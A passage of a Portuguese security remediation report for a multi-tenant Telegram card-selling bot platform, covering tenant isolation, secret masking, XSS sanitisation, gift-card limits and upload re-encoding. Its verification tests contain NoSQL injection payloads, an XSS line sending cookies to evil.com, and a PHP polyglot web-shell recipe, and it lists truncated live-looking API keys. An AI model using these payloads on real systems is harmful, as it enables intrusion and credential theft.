curl -s -X POST "https://api.clone.com/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$ne":"wrong"}}'
# Esperado: 400 {"error":"Credenciais invalidas"} (tipo invalido)

# 2. Operador $regex deve ser bloqueado
curl -s -X POST "https://api.clone.com/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$regex":"^a.*"}}'
# Esperado: 400 {"error":"Credenciais invalidas"}

# 3. Login normal deve funcionar
curl -s -X POST "https://api.clone.com/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"senhaCorreta123"}'
# Esperado: 200 {"token":"...","user":{...}}

# 4. Mensagem de erro deve ser identica para usuario inexistente e senha errada
# (ambos retornam exatamente "Credenciais invalidas")

# 5. Timing deve ser similar para usuario existente vs inexistente
# (bcrypt.compare executado em ambos os casos)
```

---

## VULN-006 — Cross-Tenant Data Access (ALTA)

**CVSS:** 7.5 | **Prioridade:** IMEDIATA
**Endpoint(s) afetado(s):** Multiplos endpoints com parametro `bot_id`:
- `GET /api/cards?bot_id=X`
- `GET/POST /admin/telegram/settings?bot_id=X`
- `GET /admin/unified-recharge-settings?bot_id=X`
- `GET /admin/dashboard?bot_id=X`
- `POST /api/purchases` (cardId de outro tenant)

### Causa Raiz

O parametro `bot_id` enviado pelo cliente NAO e validado contra o `owner_id` do tenant
autenticado. Qualquer admin pode enviar um `bot_id` arbitrario para ler/escrever
configuracoes de outros tenants, acessar catalogos de cartoes e ate comprar cartoes de
outros tenants.

### Como Corrigir

**Arquivo:** `backend/src/middleware/tenantAuth.js` (NOVO)

```javascript
// ==============================================================
// backend/src/middleware/tenantAuth.js (NOVO ARQUIVO)
// ==============================================================

const TelegramBot = require('../models/TelegramBot');

// Cache em memoria para evitar queries repetidas (TTL: 5min)
const botOwnerCache = new Map();
const CACHE_TTL = 5 * 60 * 1000;

/**
 * Middleware centralizado de autorizacao multi-tenant.
 * Garante que o bot_id pertence ao owner_id do tenant autenticado.
 */
async function requireBotOwnership(req, res, next) {
  // Extrair bot_id do body, query ou params
  const botId = req.body?.bot_id || req.query?.bot_id || req.params?.bot_id;

  // Se nao tem bot_id, usar o bot padrao do tenant
  if (!botId) {
    // Buscar bot padrao do tenant
    const defaultBot = await TelegramBot.findOne({
      owner_id: req.user.owner_id,
      is_default: true
    });

    if (defaultBot) {
      req.tenantBotId = defaultBot.bot_id;
    }
    return next();
  }

  const botIdNum = parseInt(botId, 10);
  if (isNaN(botIdNum) || botIdNum <= 0) {
    return res.status(400).json({ error: 'bot_id invalido' });
  }

  // Verificar cache primeiro
  const cacheKey = `${botIdNum}:${req.user.owner_id}`;
  const cached = botOwnerCache.get(cacheKey);

  if (cached && Date.now() - cached.timestamp < CACHE_TTL) {
    if (!cached.allowed) {
      return res.status(403).json({ error: 'Acesso negado a este bot' });
    }
    req.tenantBotId = botIdNum;
    return next();
  }

  // Query no banco: verificar se bot pertence ao tenant
  const bot = await TelegramBot.findOne({
    bot_id: botIdNum,
    owner_id: req.user.owner_id
  });

  const allowed = !!bot;

  // Salvar no cache
  botOwnerCache.set(cacheKey, { allowed, timestamp: Date.now() });

  if (!allowed) {
    console.warn(`[SECURITY] Cross-tenant access blocked: ` +
      `userId=${req.user.id} owner_id=${req.user.owner_id} ` +
      `requested_bot_id=${botIdNum}`);
    return res.status(403).json({ error: 'Acesso negado a este bot' });
  }

  req.tenantBotId = botIdNum;
  next();
}

/**
 * Middleware para validar que um cardId pertence ao tenant.
 * Usado no fluxo de compra.
 */
async function requireCardInTenant(req, res, next) {
  const { cardId } = req.body;

  if (!cardId) {
    return next();
  }

  const card = await Card.findOne({ cardId });
  if (!card) {
    return res.status(404).json({ error: 'Cartao nao encontrado' });
  }

  // Verificar se o card pertence a um bot do tenant
  const bot = await TelegramBot.findOne({
    bot_id: card.bot_id,
    owner_id: req.user.owner_id
  });

  if (!bot) {
    console.warn(`[SECURITY] Cross-tenant card purchase blocked: ` +
      `userId=${req.user.id} cardId=${cardId} card_bot_id=${card.bot_id}`);
    return res.status(403).json({ error: 'Acesso negado a este cartao' });
  }

  next();
}

// Limpar cache periodicamente
setInterval(() => {
  const now = Date.now();
  for (const [key, value] of botOwnerCache) {
    if (now - value.timestamp > CACHE_TTL) {
      botOwnerCache.delete(key);
    }
  }
}, CACHE_TTL);

module.exports = { requireBotOwnership, requireCardInTenant };


// ==============================================================
// APLICAR EM TODAS AS ROTAS QUE ACEITAM bot_id
// ==============================================================

const { requireBotOwnership, requireCardInTenant } = require('../middleware/tenantAuth');

// Cards
router.get('/api/cards', authMiddleware, requireBotOwnership, cardController.list);

// Telegram settings
router.get('/admin/telegram/settings', authMiddleware, requireAdmin, requireBotOwnership, settingsController.get);
router.post('/admin/telegram/settings', authMiddleware, requireAdmin, requireBotOwnership, settingsController.update);

// Recharge settings
router.get('/admin/unified-recharge-settings', authMiddleware, requireAdmin, requireBotOwnership, rechargeController.get);

// Dashboard
router.get('/admin/dashboard', authMiddleware, requireAdmin, requireBotOwnership, dashboardController.get);

// Purchases (validar card pertence ao tenant)
router.post('/api/purchases', authMiddleware, requireCardInTenant, purchaseController.create);
```

### Teste de Verificacao

```bash
# 1. Acessar bot proprio — deve funcionar
curl -s "https://api.clone.com/api/cards?bot_id=60" \
  -H "Authorization: Bearer $TOKEN_TENANT_A"
# Esperado: 200 (bot_id 60 pertence ao tenant A)

# 2. Acessar bot de outro tenant — deve ser bloqueado
curl -s "https://api.clone.com/api/cards?bot_id=1" \
  -H "Authorization: Bearer $TOKEN_TENANT_A"
# Esperado: 403 {"error":"Acesso negado a este bot"}

# 3. Escrever settings de outro tenant — deve ser bloqueado
curl -s -X POST "https://api.clone.com/admin/telegram/settings" \
  -H "Authorization: Bearer $TOKEN_TENANT_A" \
  -H "Content-Type: application/json" \
  -d '{"bot_id":1,"exchange_channel":"HACKED"}'
# Esperado: 403 {"error":"Acesso negado a este bot"}

# 4. Comprar card de outro tenant — deve ser bloqueado
curl -s -X POST "https://api.clone.com/api/purchases" \
  -H "Authorization: Bearer $TOKEN_TENANT_A" \
  -H "Content-Type: application/json" \
  -d '{"cardId":541478}'
# Esperado: 403 {"error":"Acesso negado a este cartao"} (se card pertence a outro tenant)

# 5. bot_id invalido (nao numerico)
curl -s "https://api.clone.com/api/cards?bot_id=abc" \
  -H "Authorization: Bearer $TOKEN"
# Esperado: 400 {"error":"bot_id invalido"}
```

---

## VULN-007 — API Keys em Plaintext (ALTA)

**CVSS:** 7.2 | **Prioridade:** URGENTE
**Endpoint(s) afetado(s):** `GET /admin/checker-settings`, `GET /admin/automatic-pix-settings`, `GET /admin/telegram-bots`

### Causa Raiz

Os endpoints administrativos retornam credenciais de servicos externos (API keys, webhook
secrets, URLs internas) em texto puro nas respostas JSON. Qualquer comprometimento de
sessao admin expoe todas as chaves de integracao.

Chaves expostas na plataforma original:
- Checker API Key: `sk_71922c2c865bef860ecd...`
- PrimePix API Key: `0499f75f783fe2fb8092...`
- PIX Webhook Secret: `_rsCh-5PBMZRqfIqzDW...`
- Supplier Webhook Key: `a024dd5b47594676...`

### Como Corrigir

**Arquivo:** `backend/src/utils/secretManager.js` (NOVO)

```javascript
// ==============================================================
// backend/src/utils/secretManager.js (NOVO ARQUIVO)
// ==============================================================

const crypto = require('crypto');

// Chave de criptografia para segredos em repouso
// DEVE vir de variavel de ambiente, NUNCA hardcoded
const ENCRYPTION_KEY = process.env.SECRET_ENCRYPTION_KEY; // 32 bytes hex
const ALGORITHM = 'aes-256-gcm';

/**
 * Mascara uma chave para exibicao no frontend.
 * Exemplo: "sk_71922c2c865bef860ecd" → "sk_****...0ecd"
 */
function maskSecret(secret) {
  if (!secret || typeof secret !== 'string') return '****';
  if (secret.length <= 8) return '****';

  const prefix = secret.substring(0, 3);
  const suffix = secret.substring(secret.length - 4);
  return `${prefix}****...${suffix}`;
}

/**
 * Criptografa um segredo para armazenamento no banco.
 */
function encryptSecret(plaintext) {
  if (!ENCRYPTION_KEY) {
    throw new Error('SECRET_ENCRYPTION_KEY nao configurada');
  }

  const iv = crypto.randomBytes(16);
  const key = Buffer.from(ENCRYPTION_KEY, 'hex');
  const cipher = crypto.createCipheriv(ALGORITHM, key, iv);

  let encrypted = cipher.update(plaintext, 'utf8', 'hex');
  encrypted += cipher.final('hex');

  const authTag = cipher.getAuthTag().toString('hex');

  // Formato: iv:authTag:ciphertext
  return `${iv.toString('hex')}:${authTag}:${encrypted}`;
}

/**
 * Descriptografa um segredo armazenado.
 */
function decryptSecret(encryptedData) {
  if (!ENCRYPTION_KEY) {
    throw new Error('SECRET_ENCRYPTION_KEY nao configurada');
  }

  const [ivHex, authTagHex, ciphertext] = encryptedData.split(':');
  const key = Buffer.from(ENCRYPTION_KEY, 'hex');
  const iv = Buffer.from(ivHex, 'hex');
  const authTag = Buffer.from(authTagHex, 'hex');

  const decipher = crypto.createDecipheriv(ALGORITHM, key, iv);
  decipher.setAuthTag(authTag);

  let decrypted = decipher.update(ciphertext, 'hex', 'utf8');
  decrypted += decipher.final('utf8');

  return decrypted;
}

/**
 * Transforma um objeto de configuracao para resposta da API.
 * Mascara todos os campos que contem segredos.
 */
function sanitizeSettingsForResponse(settings, secretFields) {
  const sanitized = { ...settings.toObject ? settings.toObject() : settings };

  for (const field of secretFields) {
    if (sanitized[field]) {
      sanitized[field] = maskSecret(sanitized[field]);
    }
  }

  return sanitized;
}

module.exports = {
  maskSecret,
  encryptSecret,
  decryptSecret,
  sanitizeSettingsForResponse
};


// ==============================================================
// Exemplo de uso nos controllers
// ==============================================================

// GET /admin/checker-settings
const { sanitizeSettingsForResponse } = require('../utils/secretManager');

router.get('/admin/checker-settings',
  authMiddleware,
  requireAdmin,
  requireBotOwnership,
  async (req, res) => {
    const settings = await CheckerSettings.findOne({
      owner_id: req.user.owner_id
    });

    // MASCARAR segredos na resposta
    const safe = sanitizeSettingsForResponse(settings, [
      'api_key',
      'api_secret',
      'webhook_secret'
    ]);

    // URL tambem parcialmente mascarada
    if (safe.api_url) {
      const url = new URL(safe.api_url);
      safe.api_url = `${url.protocol}//${url.hostname}/****`;
    }

    res.json(safe);
  }
);

// POST /admin/checker-settings (SALVAR criptografado)
const { encryptSecret } = require('../utils/secretManager');

router.post('/admin/checker-settings',
  authMiddleware,
  requireAdmin,
  async (req, res) => {
    const updates = { ...req.body };

    // Criptografar segredos antes de salvar
    if (updates.api_key) {
      updates.api_key_encrypted = encryptSecret(updates.api_key);
      delete updates.api_key; // nao salvar em plaintext
    }

    await CheckerSettings.findOneAndUpdate(
      { owner_id: req.user.owner_id },
      updates,
      { upsert: true }
    );

    res.json({ success: true });
  }
);
```

### Teste de Verificacao

```bash
# 1. GET checker-settings — chaves devem estar mascaradas
curl -s "https://api.clone.com/admin/checker-settings" \
  -H "Authorization: Bearer $TOKEN" | jq .
# Esperado: {"api_key":"sk_****...0ecd","api_url":"https://checker.example.com/****",...}

# 2. GET pix-settings — webhook secret mascarado
curl -s "https://api.clone.com/admin/automatic-pix-settings" \
  -H "Authorization: Bearer $TOKEN" | jq .
# Esperado: {"pix_api_key":"049****...8092","webhook_secret":"_rs****...9Lw",...}

# 3. Verificar que o banco armazena criptografado
# mongo> db.checkerSettings.findOne({owner_id: 283518})
# api_key_encrypted: "a1b2c3...:d4e5f6...:789abc..." (formato iv:tag:cipher)
# NAO deve existir campo api_key em plaintext

# 4. Funcionalidade preservada: mass-check deve funcionar
# (backend descriptografa internamente para fazer a requisicao)
```

---

## VULN-008 — Stored XSS em Bot Settings (ALTA)

**CVSS:** 6.8 | **Prioridade:** URGENTE
**Endpoint(s) afetado(s):** `POST /api/admin/telegram/settings`

### Causa Raiz

Os campos `terms_message`, `help_message`, `welcome_message` e outros campos de texto
HTML aceitam conteudo arbitrario incluindo tags `<script>`, `<img onerror=...>` e event
handlers. Esse conteudo e renderizado para 9.800+ usuarios Telegram e tambem no painel
admin sem sanitizacao.

### Como Corrigir

**Arquivo:** `backend/src/utils/htmlSanitizer.js` (NOVO) e headers CSP

```javascript
// ==============================================================
// backend/src/utils/htmlSanitizer.js (NOVO ARQUIVO)
// ==============================================================

// npm install sanitize-html
const sanitizeHtml = require('sanitize-html');

// Configuracao restritiva — permite apenas formatacao basica
const SANITIZE_OPTIONS = {
  allowedTags: [
    'b', 'i', 'u', 's', 'em', 'strong',
    'a', 'br', 'p', 'span',
    'ul', 'ol', 'li',
    'h1', 'h2', 'h3', 'h4',
    'blockquote', 'code', 'pre'
  ],
  allowedAttributes: {
    'a': ['href', 'title', 'target', 'rel'],
    'span': ['class'],  // somente classes pre-definidas
  },
  allowedSchemes: ['https', 'http', 'mailto', 'tg'],  // tg:// para Telegram
  // BLOQUEAR todos event handlers
  disallowedTagsMode: 'discard',
  // Forcar rel=noopener em links
  transformTags: {
    'a': sanitizeHtml.simpleTransform('a', {
      target: '_blank',
      rel: 'noopener noreferrer'
    })
  },
  // Limite de tamanho
  textFilter: function(text) {
    return text.substring(0, 5000);
  }
};

/**
 * Sanitiza HTML de campos de mensagem do bot.
 */
function sanitizeBotMessage(html) {
  if (typeof html !== 'string') return '';
  return sanitizeHtml(html, SANITIZE_OPTIONS);
}

/**
 * Sanitiza todos os campos de mensagem em um objeto de settings.
 */
function sanitizeBotSettings(settings) {
  const messageFields = [
    'welcome_message',
    'terms_message',
    'help_message',
    'purchase_message',
    'recharge_message',
    'support_message'
  ];

  const sanitized = { ...settings };

  for (const field of messageFields) {
    if (sanitized[field]) {
      sanitized[field] = sanitizeBotMessage(sanitized[field]);
    }
  }

  return sanitized;
}

module.exports = { sanitizeBotMessage, sanitizeBotSettings };


// ==============================================================
// backend/src/routes/admin/telegramSettings.js (CORRIGIDO)
// ==============================================================

const { sanitizeBotSettings } = require('../../utils/htmlSanitizer');

router.post('/api/admin/telegram/settings',
  authMiddleware,
  requireAdmin,
  requireBotOwnership,
  async (req, res) => {
    // SANITIZAR todos os campos HTML antes de salvar
    const sanitizedBody = sanitizeBotSettings(req.body);

    await TelegramSettings.findOneAndUpdate(
      { bot_id: req.tenantBotId, owner_id: req.user.owner_id },
      sanitizedBody,
      { upsert: true }
    );

    res.json({ success: true });
  }
);


// ==============================================================
// backend/src/middleware/securityHeaders.js (CSP)
// ==============================================================

const helmet = require('helmet');
// npm install helmet

const securityHeaders = helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],   // BLOQUEIA inline scripts
      styleSrc: ["'self'", "'unsafe-inline'"],  // CSS inline permitido
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'", process.env.API_URL],
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],
      mediaSrc: ["'none'"],
      frameSrc: ["'none'"],
      baseUri: ["'self'"],
      formAction: ["'self'"],
      frameAncestors: ["'none'"],
    }
  },
  crossOriginEmbedderPolicy: true,
  crossOriginOpenerPolicy: true,
  crossOriginResourcePolicy: { policy: "same-origin" },
  hsts: { maxAge: 31536000, includeSubDomains: true, preload: true },
  noSniff: true,
  referrerPolicy: { policy: "strict-origin-when-cross-origin" },
  xssFilter: true,
});

module.exports = { securityHeaders };


// ==============================================================
// backend/src/app.js (APLICAR)
// ==============================================================

const { securityHeaders } = require('./middleware/securityHeaders');
app.use(securityHeaders); // PRIMEIRO middleware
```

### Teste de Verificacao

```bash
# 1. Tentar XSS via img onerror — deve ser removido
curl -s -X POST "https://api.clone.com/api/admin/telegram/settings" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"terms_message":"<img src=x onerror=alert(1)>"}'
# Salvar e depois ler:
curl -s "https://api.clone.com/admin/telegram/settings?bot_id=60" \
  -H "Authorization: Bearer $TOKEN" | jq .terms_message
# Esperado: "" (img sem src valido e removido)

# 2. Tentar script tag — deve ser removido
curl -s -X POST "https://api.clone.com/api/admin/telegram/settings" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"welcome_message":"<script>document.location=\"https://evil.com/\"+document.cookie</script>Bem-vindo!"}'
# Esperado: welcome_message = "Bem-vindo!" (script removido)

# 3. HTML seguro deve ser preservado
curl -s -X POST "https://api.clone.com/api/admin/telegram/settings" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"help_message":"<b>Ajuda:</b><br><a href=\"https://example.com\">Clique aqui</a>"}'
# Esperado: HTML preservado com rel="noopener noreferrer" adicionado ao link

# 4. Verificar headers CSP
curl -sI "https://api.clone.com/" | grep -i content-security-policy
# Esperado: Content-Security-Policy: default-src 'self'; script-src 'self'; ...
```

---

## VULN-009 — Gift Card Self-Recharge (MEDIA)

**CVSS:** 6.5 | **Prioridade:** URGENTE
**Endpoint(s) afetado(s):** `POST /admin/telegram/gift-cards/bulk`, `POST /assistant/gift-cards`

### Causa Raiz

O sistema permite que admins criem gift cards com valor e quantidade arbitrarios sem
nenhum controle:

1. Sem limite de valor maximo por gift card
2. Sem limite de quantidade por geracao
3. Sem debito do saldo do tenant (criacao "do nada")
4. Sem prevencao de auto-resgate (admin cria e resgata para si mesmo)

### Como Corrigir

**Arquivo:** `backend/src/routes/admin/giftCards.js`

```javascript
// ==============================================================
// backend/src/routes/admin/giftCards.js (CORRIGIDO)
// ==============================================================

const mongoose = require('mongoose');

// Limites configuráveis
const GIFT_CARD_LIMITS = {
  MAX_VALUE: 500.00,          // Valor maximo por gift card
  MAX_QUANTITY_PER_BATCH: 50, // Maximo por geracao
  MAX_DAILY_VALUE: 5000.00,   // Valor total maximo por dia por tenant
  MAX_DAILY_BATCHES: 10       // Maximo de geracoes por dia
};

router.post('/admin/telegram/gift-cards/bulk',
  authMiddleware,
  requireAdmin,
  async (req, res) => {
    const { value, quantity, bot_id } = req.body;

    // 1. Validar tipos
    if (typeof value !== 'number' || typeof quantity !== 'number') {
      return res.status(400).json({ error: 'Valor e quantidade devem ser numeros' });
    }

    // 2. Validar limites de valor
    if (value <= 0 || value > GIFT_CARD_LIMITS.MAX_VALUE) {
      return res.status(400).json({
        error: `Valor deve ser entre R$0.01 e R$${GIFT_CARD_LIMITS.MAX_VALUE}`
      });
    }

    // 3. Validar limites de quantidade
    if (quantity <= 0 || quantity > GIFT_CARD_LIMITS.MAX_QUANTITY_PER_BATCH ||
        !Number.isInteger(quantity)) {
      return res.status(400).json({
        error: `Quantidade deve ser entre 1 e ${GIFT_CARD_LIMITS.MAX_QUANTITY_PER_BATCH}`
      });
    }

    // 4. Verificar limite diario
    const today = new Date();
    today.setHours(0, 0, 0, 0);

    const dailyStats = await GiftCard.aggregate([
      {
        $match: {
          created_by: req.user.id,
          created_at: { $gte: today }
        }
      },
      {
        $group: {
          _id: null,
          totalValue: { $sum: '$value' },
          totalCards: { $sum: 1 },
          batchCount: { $addToSet: '$batch_id' }
        }
      }
    ]);

    const stats = dailyStats[0] || { totalValue: 0, batchCount: [] };
    const totalValueToday = stats.totalValue + (value * quantity);

    if (totalValueToday > GIFT_CARD_LIMITS.MAX_DAILY_VALUE) {
      return res.status(429).json({
        error: `Limite diario de R$${GIFT_CARD_LIMITS.MAX_DAILY_VALUE} excedido`,
        remaining: GIFT_CARD_LIMITS.MAX_DAILY_VALUE - stats.totalValue
      });
    }

    if ((stats.batchCount?.length || 0) >= GIFT_CARD_LIMITS.MAX_DAILY_BATCHES) {
      return res.status(429).json({
        error: `Limite de ${GIFT_CARD_LIMITS.MAX_DAILY_BATCHES} geracoes por dia excedido`
      });
    }

    // 5. DEBITAR saldo do tenant (gift cards NAO sao "gratis")
    const totalCost = value * quantity;
    const session = await mongoose.startSession();
    session.startTransaction();

    try {
      const tenant = await User.findOneAndUpdate(
        {
          _id: req.user.id,
          balance: { $gte: totalCost }
        },
        { $inc: { balance: -totalCost } },
        { new: true, session }
      );

      if (!tenant) {
        await session.abortTransaction();
        return res.status(402).json({
          error: 'Saldo insuficiente para gerar gift cards',
          required: totalCost
        });
      }

      // 6. Gerar gift cards
      const batchId = new mongoose.Types.ObjectId();
      const giftCards = [];

      for (let i = 0; i < quantity; i++) {
        giftCards.push({
          code: generateGiftCardCode(),
          value,
          bot_id,
          batch_id: batchId,
          created_by: req.user.id,
          created_at: new Date(),
          status: 'active',
          // Bloquear auto-resgate
          blocked_users: [req.user.id]
        });
      }

      await GiftCard.insertMany(giftCards, { session });
      await session.commitTransaction();

      console.log(`[AUDIT] Gift cards created: userId=${req.user.id} ` +
        `quantity=${quantity} value=${value} total=${totalCost}`);

      res.json({
        message: `${quantity} gift cards criados`,
        giftCards: giftCards.map(gc => ({
          code: gc.code,
          value: gc.value
        })),
        balance_after: tenant.balance
      });

    } catch (error) {
      await session.abortTransaction();
      console.error('[GIFT CARD ERROR]', error);
      res.status(500).json({ error: 'Erro ao gerar gift cards' });
    } finally {
      session.endSession();
    }
  }
);

// ==============================================================
// Endpoint de resgate com anti-self-redeem
// ==============================================================

router.post('/api/gift-cards/redeem',
  authMiddleware,
  async (req, res) => {
    const { code } = req.body;

    const giftCard = await GiftCard.findOne({ code, status: 'active' });
    if (!giftCard) {
      return res.status(404).json({ error: 'Gift card invalido ou ja utilizado' });
    }

    // BLOQUEAR auto-resgate
    if (giftCard.blocked_users.includes(req.user.id)) {
      console.warn(`[SECURITY] Self-redeem blocked: userId=${req.user.id} code=${code}`);
      return res.status(403).json({
        error: 'Voce nao pode resgatar gift cards criados por voce'
      });
    }

    // Processar resgate com transacao atomica...
    // (similar ao padrao usado em VULN-001)
  }
);
```

### Teste de Verificacao

```bash
# 1. Valor acima do limite — deve ser rejeitado
curl -s -X POST "https://api.clone.com/admin/telegram/gift-cards/bulk" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"value":99999,"quantity":1,"bot_id":60}'
# Esperado: 400 {"error":"Valor deve ser entre R$0.01 e R$500"}

# 2. Quantidade excessiva — deve ser rejeitada
curl -s -X POST "https://api.clone.com/admin/telegram/gift-cards/bulk" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"value":10,"quantity":1000,"bot_id":60}'
# Esperado: 400 {"error":"Quantidade deve ser entre 1 e 50"}

# 3. Saldo insuficiente — deve ser rejeitado (gift cards debitam saldo)
# (com saldo R$0)
curl -s -X POST "https://api.clone.com/admin/telegram/gift-cards/bulk" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"value":10,"quantity":1,"bot_id":60}'
# Esperado: 402 {"error":"Saldo insuficiente para gerar gift cards","required":10}

# 4. Auto-resgate — deve ser bloqueado
# (admin cria gift card e tenta resgatar com a mesma conta)
curl -s -X POST "https://api.clone.com/api/gift-cards/redeem" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"code":"QDKF-4L79-DBYF-FU4S-BWQA-J"}'
# Esperado: 403 {"error":"Voce nao pode resgatar gift cards criados por voce"}
```

---

## VULN-010 — Upload Polyglot JPEG+PHP (MEDIA)

**CVSS:** 5.3 | **Prioridade:** ALTA
**Endpoint(s) afetado(s):** `POST /api/admin/telegram/start-image`

### Causa Raiz

O endpoint de upload de imagem so valida os magic bytes do cabecalho JPEG (`FF D8 FF`),
mas NAO processa a imagem para remover metadados. Isso permite upload de arquivos
polyglot que contem codigo PHP/ASP embarcado em markers EXIF/COM, que seriam executados
se o servidor fosse reconfigurado para processar PHP.

Nomes de arquivo sao previsiveis: `start-image-{timestamp}.jpg`

### Como Corrigir

**Arquivo:** `backend/src/middleware/uploadProcessor.js` (NOVO)

```javascript
// ==============================================================
// backend/src/middleware/uploadProcessor.js (NOVO ARQUIVO)
// ==============================================================

// npm install sharp uuid
const sharp = require('sharp');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const fs = require('fs').promises;

// Diretorio de uploads (FORA do webroot)
const UPLOAD_DIR = process.env.UPLOAD_DIR || '/var/uploads/images';

// Limites
const MAX_FILE_SIZE = 5 * 1024 * 1024;  // 5MB
const ALLOWED_MIME_TYPES = ['image/jpeg', 'image/png', 'image/webp'];

/**
 * Processa upload de imagem de forma segura:
 * 1. Valida MIME type real (magic bytes)
 * 2. Re-codifica a imagem com sharp (remove EXIF, COM markers, payloads)
 * 3. Gera nome aleatorio UUID
 * 4. Salva fora do webroot
 */
async function processImageUpload(req, res, next) {
  if (!req.file) {
    return res.status(400).json({ error: 'Nenhum arquivo enviado' });
  }

  const file = req.file;

  // 1. Verificar tamanho
  if (file.size > MAX_FILE_SIZE) {
    await fs.unlink(file.path).catch(() => {});
    return res.status(400).json({
      error: `Arquivo muito grande. Maximo: ${MAX_FILE_SIZE / 1024 / 1024}MB`
    });
  }

  // 2. Validar tipo REAL da imagem (nao confiar no Content-Type)
  try {
    const metadata = await sharp(file.path).metadata();

    if (!['jpeg', 'png', 'webp'].includes(metadata.format)) {
      await fs.unlink(file.path).catch(() => {});
      return res.status(400).json({
        error: 'Formato de imagem invalido. Use JPEG, PNG ou WebP.'
      });
    }

    // 3. RE-CODIFICAR a imagem (elimina TODOS os payloads embarcados)
    const uuid = uuidv4();
    const extension = metadata.format === 'jpeg' ? 'jpg' : metadata.format;
    const safeFilename = `${uuid}.${extension}`;
    const outputPath = path.join(UPLOAD_DIR, safeFilename);

    await sharp(file.path)
      .rotate()               // Auto-rotacionar baseado em EXIF
      .removeAlpha()          // Remover canal alpha se presente
      .jpeg({
        quality: 85,
        mozjpeg: true,
        chromaSubsampling: '4:2:0'
      })
      // Nao chamar .withMetadata() — isso REMOVE todos os metadados
      .toFile(outputPath);

    // 4. Remover arquivo original (com possivel payload)
    await fs.unlink(file.path).catch(() => {});

    // 5. Anexar informacoes ao request
    req.processedImage = {
      filename: safeFilename,
      path: outputPath,
      url: `/uploads/images/${safeFilename}`, // URL relativa
      size: (await fs.stat(outputPath)).size,
      format: 'jpeg'
    };

    next();

  } catch (error) {
    await fs.unlink(file.path).catch(() => {});
    console.error('[UPLOAD] Erro ao processar imagem:', error.message);
    return res.status(400).json({ error: 'Arquivo nao e uma imagem valida' });
  }
}

module.exports = { processImageUpload };


// ==============================================================
// backend/src/routes/admin/telegram.js (CORRIGIDO)
// ==============================================================

const multer = require('multer');
const { processImageUpload } = require('../../middleware/uploadProcessor');

// Multer com armazenamento temporario
const upload = multer({
  dest: '/tmp/uploads/',
  limits: { fileSize: 5 * 1024 * 1024 }
});

router.post('/api/admin/telegram/start-image',
  authMiddleware,
  requireAdmin,
  upload.single('image'),
  processImageUpload,  // <-- RE-CODIFICA a imagem
  async (req, res) => {
    // Usar req.processedImage (seguro, sem payloads)
    await TelegramSettings.findOneAndUpdate(
      { bot_id: req.tenantBotId, owner_id: req.user.owner_id },
      { start_image: req.processedImage.url },
      { upsert: true }
    );

    res.json({
      success: true,
      image_url: req.processedImage.url
    });
  }
);


// ==============================================================
// Nginx: servir uploads com headers restritivos
// ==============================================================

/*
  # /etc/nginx/conf.d/uploads.conf

  location /uploads/ {
    alias /var/uploads/;

    # CRITICO: nunca executar arquivos neste diretorio
    location ~ \.php$ { deny all; }
    location ~ \.asp$ { deny all; }
    location ~ \.jsp$ { deny all; }

    # Headers de seguranca
    add_header X-Content-Type-Options "nosniff" always;
    add_header Content-Disposition "inline" always;
    add_header Cache-Control "public, max-age=86400";

    # Limitar tipos servidos
    types {
      image/jpeg jpg jpeg;
      image/png  png;
      image/webp webp;
    }
    default_type application/octet-stream;
  }
*/
```

### Teste de Verificacao

```bash
# 1. Upload de imagem valida — deve funcionar
curl -s -X POST "https://api.clone.com/api/admin/telegram/start-image" \
  -H "Authorization: Bearer $TOKEN" \
  -F "image=@foto_normal.jpg"
# Esperado: 200 {"success":true,"image_url":"/uploads/images/UUID.jpg"}

# 2. Upload de polyglot JPEG+PHP — payload deve ser removido
# Criar polyglot:
# printf '\xFF\xD8\xFF\xFE\x00\x20<?php system($_GET["cmd"]); ?>' > polyglot.jpg
curl -s -X POST "https://api.clone.com/api/admin/telegram/start-image" \
  -H "Authorization: Bearer $TOKEN" \
  -F "image=@polyglot.jpg"
# Se aceito, verificar que re-codificacao removeu o PHP:
# hexdump -C /var/uploads/images/UUID.jpg | grep -c "php"
# Esperado: 0 (nenhuma ocorrencia de "php")

# 3. Upload de arquivo .php renomeado — deve ser rejeitado
cp shell.php shell.jpg
curl -s -X POST "https://api.clone.com/api/admin/telegram/start-image" \
  -H "Authorization: Bearer $TOKEN" \
  -F "image=@shell.jpg"
# Esperado: 400 {"error":"Arquivo nao e uma imagem valida"}

# 4. Verificar header X-Content-Type-Options
curl -sI "https://api.clone.com/uploads/images/UUID.jpg" | grep nosniff
# Esperado: X-Content-Type-Options: nosniff

# 5. Nome do arquivo deve ser UUID (nao previsivel)
# Verificar que NAO e "start-image-{timestamp}.jpg"
```

---

## VULN-011 — Info Disclosure no Frontend Bundle (MEDIA)

**CVSS:** 5.0 | **Prioridade:** ALTA
**Endpoint(s) afetado(s):** `/assets/index-*.js` (bundle React)

### Causa Raiz

O bundle JavaScript do frontend (1.6MB) contem codigo nao-ofuscado que expoe:

1. 175+ endpoints de API com parametros completos
2. 3 paineis "secretos" com hash MD5 na URL
3. Rota `/superadmin2025` do superadmin
4. Redux store structure e business logic completa
5. Nomes internos de servicos e funcoes

### Como Corrigir

**Arquivo:** `frontend/vite.config.js`

```javascript
// ==============================================================
// frontend/vite.config.js (CORRIGIDO)
// ==============================================================

import { defineConfig } from 'vite';
import react from '@vitejs/plugin-react';

export default defineConfig({
  plugins: [react()],

  build: {
    // 1. Habilitar minificacao agressiva com terser
    minify: 'terser',
    terserOptions: {
      compress: {
        drop_console: true,      // Remover console.log em producao
        drop_debugger: true,     // Remover debugger
        dead_code: true,
        passes: 2,
